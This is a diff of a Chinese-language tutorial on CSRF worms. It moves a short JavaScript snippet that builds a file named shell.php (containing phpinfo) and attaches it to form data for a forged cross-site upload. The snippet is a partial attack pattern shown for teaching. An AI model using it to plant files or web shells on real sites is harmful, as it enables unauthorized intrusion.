@@ -209,10 +209,6 @@ CSRF蠕虫是指一种能够自我传播的CSRF攻击。当一名受害者触发
 ![](img/7137fc91cc91db1244bc898ca9d827f9_102.png)
 
 一个简化的利用思路如下：
-```javascript
-// 1. 在恶意页面中创建一个文件对象（内容可为恶意脚本）
-var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/plain"});
-var file = new File([blob], "shell.php");
 
 ![](img/7137fc91cc91db1244bc898ca9d827f9_104.png)
 
@@ -220,6 +216,10 @@ var file = new File([blob], "shell.php");
 
 ![](img/7137fc91cc91db1244bc898ca9d827f9_108.png)
 
+```javascript
+// 1. 在恶意页面中创建一个文件对象（内容可为恶意脚本）
+var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/plain"});
+var file = new File([blob], "shell.php");
 // 2. 构造FormData并附加文件
 var formData = new FormData();
 formData.append("file", file, "shell.php");
